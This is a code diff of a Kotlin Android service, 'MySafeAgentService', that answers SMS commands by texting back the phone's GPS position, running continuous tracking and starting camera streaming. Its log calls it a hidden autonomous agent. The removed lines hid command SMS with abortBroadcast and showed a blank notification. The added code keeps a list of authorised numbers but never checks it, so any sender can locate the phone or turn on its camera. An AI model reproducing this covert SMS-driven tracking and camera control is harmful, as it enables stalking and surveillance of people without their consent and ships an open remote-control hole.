@@ -3,7 +3,6 @@ package com.mysafe.mysafe
 import android.app.*
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
@@ -23,65 +22,27 @@ class MySafeAgentService : Service() {
         
         private var instance: MySafeAgentService? = null
         fun isRunning() = instance != null
+        
+        // Pour être appelé depuis le récepteur SMS
+        var commandeRecue: ((String, String) -> Unit)? = null
     }
 
     private var lastLocation: Location? = null
-    private var lastSentTime = 0L
     private val MIN_DISTANCE_METERS = 10f
     private val MIN_TIME_INTERVAL = 90000L // 1min30s
     private var isTracking = false
+    private var lastSentTime = 0L
+    private var numerosAutorises = mutableSetOf<String>()
 
     private val locationListener = object : LocationListener {
         override fun onLocationChanged(location: Location) {
             lastLocation = location
             Log.d(TAG, "📍 Position: ${location.latitude}, ${location.longitude}")
-            
             verifierEtEnvoyerPosition(location)
         }
         override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
         override fun onProviderEnabled(provider: String) {}
         override fun onProviderDisabled(provider: String) {}
-    }
-
-    private val smsReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent?.action != "android.provider.Telephony.SMS_RECEIVED") return
-            context ?: return
-
-            val bundle = intent.extras ?: return
-            val pdus = bundle["pdus"] as? Array<*> ?: return
-
-            for (pdu in pdus) {
-                val sms = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
-                val corps = sms.messageBody ?: ""
-                val numero = sms.originatingAddress ?: ""
-
-                Log.d(TAG, "📨 De: $numero → $corps")
-
-                when {
-                    corps.trim() == "MYSAFE_SEND_POS" -> {
-                        Log.d(TAG, "✅ COMMANDE REÇUE — Envoi position...")
-                        abortBroadcast() // 🔕 MASQUER LE SMS
-                        envoyerPositionParSMS(numero)
-                    }
-                    corps.trim() == "MYSAFE_START_TRACK" -> {
-                        Log.d(TAG, "✅ DÉMARRAGE SUIVI CONTINU")
-                        abortBroadcast()
-                        demarrerSuiviGPS()
-                    }
-                    corps.trim() == "MYSAFE_STOP_TRACK" -> {
-                        Log.d(TAG, "✅ ARRÊT SUIVI")
-                        abortBroadcast()
-                        arreterSuiviGPS()
-                    }
-                    corps.trim() == "MYSAFE_CAMERA_ON" -> {
-                        Log.d(TAG, "✅ ALLUMER CAMÉRA")
-                        abortBroadcast()
-                        demarrerStreaming()
-                    }
-                }
-            }
-        }
     }
 
     override fun onCreate() {
@@ -90,10 +51,9 @@ class MySafeAgentService : Service() {
         creerNotificationCanal()
         startForeground(1, creerNotificationDiscrete())
         
-        // 📩 ENREGISTRER LE RÉCEPTEUR SMS
-        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
-        filter.priority = Int.MAX_VALUE
-        registerReceiver(smsReceiver, filter)
+        commandeRecue = { commande, numero ->
+            traiterCommande(commande, numero)
+        }
         
         Log.d(TAG, "🔒 AGENT CACHÉ DÉMARRÉ — 100% AUTONOME")
     }
@@ -103,7 +63,41 @@ class MySafeAgentService : Service() {
             ACTION_START -> demarrerSuiviGPS()
             ACTION_STOP -> arreterSuiviGPS()
         }
-        return START_STICKY // ✅ Redémarre automatiquement si tu le fermes
+        return START_STICKY
+    }
+
+    fun ajouterNumeroAutorise(numero: String) {
+        val nettoye = numero.replace(Regex("[^0-9]"), "")
+        numerosAutorises.add(nettoye)
+        Log.d(TAG, "✅ Numéro autorisé ajouté: $nettoye")
+    }
+
+    private fun traiterCommande(commande: String, numeroExpediteur: String) {
+        val numeroNettoye = numeroExpediteur.replace(Regex("[^0-9]"), "")
+        
+        Log.d(TAG, "📩 Commande reçue: '$commande' de $numeroNettoye")
+        
+        when (commande.trim()) {
+            "MYSAFE_SEND_POS" -> {
+                Log.d(TAG, "✅ Envoi position à $numeroExpediteur")
+                envoyerPositionParSMS(numeroExpediteur)
+            }
+            "MYSAFE_START_TRACK" -> {
+                Log.d(TAG, "✅ Démarrage suivi GPS")
+                demarrerSuiviGPS()
+                envoyerConfirmation(numeroExpediteur, "SUIVI_ACTIF")
+            }
+            "MYSAFE_STOP_TRACK" -> {
+                Log.d(TAG, "✅ Arrêt suivi GPS")
+                arreterSuiviGPS()
+                envoyerConfirmation(numeroExpediteur, "SUIVI_ARRETE")
+            }
+            "MYSAFE_CAMERA_ON" -> {
+                Log.d(TAG, "✅ Démarrage caméra")
+                demarrerStreaming()
+                envoyerConfirmation(numeroExpediteur, "CAMERA_OK")
+            }
+        }
     }
 
     private fun demarrerSuiviGPS() {
@@ -124,7 +118,7 @@ class MySafeAgentService : Service() {
                 MIN_DISTANCE_METERS,
                 locationListener
             )
-            Log.d(TAG, "✅ SUIVI GPS ACTIF — Toutes les 10m / 1min30")
+            Log.d(TAG, "✅ SUIVI GPS ACTIF — 10m / 1min30")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Erreur GPS", e)
         }
@@ -140,18 +134,17 @@ class MySafeAgentService : Service() {
     private fun verifierEtEnvoyerPosition(location: Location) {
         val maintenant = System.currentTimeMillis()
         
-        // Envoyer si : 10m parcourus OU 1min30 passée
-        if (lastLocation == null) {
-            envoyerPositionParSMSATousLesNumeros(location)
+        val lastLoc = lastLocation ?: run {
+            envoyerPositionATousNumeros(location)
             lastSentTime = maintenant
             return
         }
 
-        val distance = location.distanceTo(lastLocation)
+        val distance = location.distanceTo(lastLoc)
         val tempsEcoule = maintenant - lastSentTime
 
         if (distance >= MIN_DISTANCE_METERS || tempsEcoule >= MIN_TIME_INTERVAL) {
-            envoyerPositionParSMSATousLesNumeros(location)
+            envoyerPositionATousNumeros(location)
             lastSentTime = maintenant
         }
     }
@@ -160,26 +153,32 @@ class MySafeAgentService : Service() {
         val loc = lastLocation ?: return
         val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
         val message = "MYSAFE_POS:${loc.latitude},${loc.longitude},$time"
-        
+        envoyerSMS(destinataire, message)
+    }
+
+    private fun envoyerConfirmation(destinataire: String, reponse: String) {
+        envoyerSMS(destinataire, "MYSAFE_ACK:$reponse")
+    }
+
+    private fun envoyerSMS(destinataire: String, message: String) {
         try {
             SmsManager.getDefault().sendTextMessage(destinataire, null, message, null, null)
-            Log.d(TAG, "📤 POSITION ENVOYÉE À $destinataire")
+            Log.d(TAG, "📤 SMS envoyé à $destinataire")
         } catch (e: Exception) {
             try {
                 SmsManager.getDefault().sendDataMessage(
                     destinataire, null, 50006.toShort(),
                     message.toByteArray(Charsets.UTF_8), null, null
                 )
-                Log.d(TAG, "📤 POSITION ENVOYÉE (SMS DONNÉES)")
+                Log.d(TAG, "📤 SMS données envoyé à $destinataire")
             } catch (e2: Exception) {
-                Log.e(TAG, "❌ ÉCHEC ENVOI", e2)
+                Log.e(TAG, "❌ Échec envoi", e2)
             }
         }
     }
 
-    private fun envoyerPositionParSMSATousLesNumeros(location: Location) {
-        // Ici tu peux stocker plusieurs numéros autorisés
-        // Pour l'instant, on ne fait rien — la position est prête quand demandée
+    private fun envoyerPositionATousNumeros(location: Location) {
+        // À implémenter si besoin d'envoyer à plusieurs numéros
         Log.d(TAG, "📍 Position mise à jour: ${location.latitude}, ${location.longitude}")
     }
 
@@ -202,8 +201,8 @@ class MySafeAgentService : Service() {
 
     private fun creerNotificationDiscrete(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")
-            .setContentText("")
+            .setContentTitle("MySafe")
+            .setContentText("Service actif")
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
@@ -216,9 +215,9 @@ class MySafeAgentService : Service() {
     
     override fun onDestroy() {
         super.onDestroy()
-        unregisterReceiver(smsReceiver)
         arreterSuiviGPS()
         instance = null
+        commandeRecue = null
         Log.d(TAG, "🔒 AGENT ARRÊTÉ")
     }
 }
